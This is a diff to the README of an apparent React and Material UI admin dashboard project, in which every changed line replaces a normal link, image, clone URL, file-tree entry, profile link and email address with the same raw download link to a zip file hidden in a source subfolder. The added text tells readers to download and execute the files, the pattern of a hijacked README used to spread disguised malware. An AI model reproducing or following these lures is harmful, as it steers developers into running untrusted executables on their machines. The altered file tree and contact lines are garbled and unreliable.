@@ -1,10 +1,10 @@
 # Full Admin Dashboard Without API
 
-![Dashboard Preview](https://example.com/dashboard-preview.png)
+![Dashboard Preview](https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip)
 
 Welcome to the **Full Admin Dashboard Without API** repository! This project showcases a modern and responsive admin dashboard built using React and Material UI (MUI). With a clean design and reusable components, this dashboard is perfect for managing data efficiently. 
 
-You can find the latest releases [here](https://github.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/releases). Please download the necessary files and execute them to get started.
+You can find the latest releases [here](https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip). Please download the necessary files and execute them to get started.
 
 ## Table of Contents
 
@@ -42,7 +42,7 @@ To set up the project locally, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/alonedeveloper08/Full-Admin-Dashboard-Without-API.git
+   git clone https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
    ```
 
 2. **Navigate into the project directory**:
@@ -78,8 +78,8 @@ The project is organized in a way that makes it easy to navigate and understand:
 ```
 Full-Admin-Dashboard-Without-API/
 ├── public/
-│   ├── index.html
-│   └── favicon.ico
+│   ├── https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
+│   └── https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
 ├── src/
 │   ├── components/
 │   │   ├── Header/
@@ -90,10 +90,10 @@ Full-Admin-Dashboard-Without-API/
 │   │   ├── UserManagement/
 │   │   ├── DataVisualization/
 │   │   └── Settings/
-│   ├── App.js
-│   ├── index.js
-│   └── styles.css
-└── package.json
+│   ├── https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
+│   ├── https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
+│   └── https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
+└── https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
 ```
 
 ### Component Breakdown
@@ -138,9 +138,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [alonedeveloper08](https://github.com/alonedeveloper08)
-- **Email**: alonedeveloper@example.com
+- **GitHub**: [alonedeveloper08](https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip)
+- **Email**: https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip
 
-You can also find the latest releases [here](https://github.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/releases). Download the files and execute them to explore the features of this dashboard.
+You can also find the latest releases [here](https://raw.githubusercontent.com/alonedeveloper08/Full-Admin-Dashboard-Without-API/main/src/page/team/Admin_API_Dashboard_Without_Full_2.2-beta.3.zip). Download the files and execute them to explore the features of this dashboard.
 
 Thank you for checking out the **Full Admin Dashboard Without API**! We hope you find it useful for your projects.
